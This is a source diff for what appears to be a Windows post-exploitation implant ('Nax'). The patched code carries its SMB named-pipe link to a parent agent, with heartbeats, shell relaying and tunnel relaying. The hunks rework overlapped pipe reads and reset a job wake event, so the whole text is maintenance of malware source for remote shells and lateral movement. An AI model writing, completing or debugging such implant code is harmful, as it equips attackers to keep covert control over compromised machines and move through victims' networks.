@@ -230,7 +230,7 @@ FUNC static BOOL SmbDispatchTasks( PNAX_INSTANCE Nax, PBYTE plain_buf, UINT32 pl
 }
 
 FUNC static BOOL SmbHandleParentData( PNAX_INSTANCE Nax, BOOL rdOk, OVERLAPPED* ovRead, DWORD* nRead, UINT32 hdrBuf, HANDLE hPipe, HANDLE hReadEvent, HANDLE hWriteEvent, PBYTE io_buf, UINT32 io_cap, PBYTE plain_buf, PBYTE result_buf, UINT32 result_cap, PBYTE frame_buf, UINT32 frame_cap, PBYTE env_buf, UINT32 env_cap ) {
-    if ( ! rdOk && ! Nax->Kernel32.GetOverlappedResult( hPipe, ovRead, nRead, TRUE ) ) {
+    if ( ! rdOk && ! NaxPipeWaitOv( Nax, hPipe, ovRead, nRead ) ) {
         NaxDbg( Nax, "GetOverlappedResult header failed" );
         return FALSE;
     }
@@ -451,7 +451,7 @@ FUNC VOID NaxSmbMain( PNAX_INSTANCE Nax ) {
             } else if ( wait == WAIT_TIMEOUT || ( wait > WAIT_OBJECT_0 && wait < WAIT_OBJECT_0 + handleCount ) ) {
                 Nax->Kernel32.CancelIo( hPipe );
                 DWORD nHdr = 0;
-                if ( Nax->Kernel32.GetOverlappedResult( hPipe, &ovRead, &nHdr, TRUE ) && nHdr == 4 && hdrBuf > 0 )
+                if ( Nax->Kernel32.GetOverlappedResult( hPipe, &ovRead, &nHdr, FALSE ) && nHdr == 4 && hdrBuf > 0 )
                     pipe_ok = SmbHandleParentData( Nax, TRUE, &ovRead, &nHdr, hdrBuf, hPipe, hReadEvent, hWriteEvent, io_buf, IO_CAP, plain_buf, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP );
                 else if ( wait == WAIT_TIMEOUT && idleWait )
                     pipe_ok = SmbSendHeartbeat( Nax, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent );
@@ -486,6 +486,9 @@ FUNC VOID NaxSmbMain( PNAX_INSTANCE Nax ) {
 
             if ( pipe_ok && Nax->ShellHead )
                 pipe_ok = SmbRelayShells( Nax, result_buf, RESULT_CAP, frame_buf, FRAME_CAP, env_buf, FRAME_CAP, hPipe, hWriteEvent );
+
+            if ( Nax->JobWakeEvent )
+                Nax->Kernel32.ResetEvent( Nax->JobWakeEvent );
 
             BOOL tunnelRelayed = FALSE;
             if ( pipe_ok && Nax->TunnelHead ) {
